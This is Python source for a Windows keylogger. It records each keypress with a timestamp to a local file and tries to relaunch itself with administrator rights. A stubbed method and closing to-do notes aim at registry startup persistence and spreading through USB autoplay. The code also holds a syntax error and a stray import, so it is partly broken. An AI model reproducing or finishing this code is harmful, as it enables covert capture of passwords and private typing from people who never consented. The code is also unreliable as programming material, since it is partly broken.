
from _typeshed import ExcInfo
from pynput import keyboard
from pynput.keyboard import Listener
from datetime import datetime
import os
import sys
import pyuac
# pip install pypiwin32
class Keylogger:

    def __init__(self):
        self.log = "Keylogger started ..."

    # this are primary methods which should be done
    def addToStartup(self):
        scriptPath = os.path.abspath(sys.argv[0])
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"

        try:
            pass
        
        except:
            pass

    

    # This are easy methods to understand

    def saveLogToFile(self, log):
        with open("keylog.txt", "a") as file:
            file.write(log)
            file.close()

    def saveData(self, key):
        try:
            currentKey = str(key.char) 
        except AttributeError:
            if key == key.space:
                currentKey = "SPACE" 
            elif key == key.esc:
                currentKey = "ESC" 
            else:
                currentKey = " " + str(key) + " "

        currentTime = datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
        log = currentTime + " -> " + currentKey + "\n"
        self.saveLogToFile(log)

    def run(self):

        with keyboard.Listener(on_press=self.saveData) as keyboardListener:
            keyboardListener.join()





if __name__ == "__main__":
    if not pyuac.isUserAdmin():
        print("Re-launching as admin!")
        try:
            pyuac.runAsAdmin()
        except Exception a e:
            try:
                pyuac.runAsAdmin()
            except:
                pass

    obj = Keylogger()
    obj.run()
        
































"""
--> tasks which I should do now 
    
    - the script should move to registry of windows

    - also for pendrive just research about autoplay and python code 
      to on that also


"""


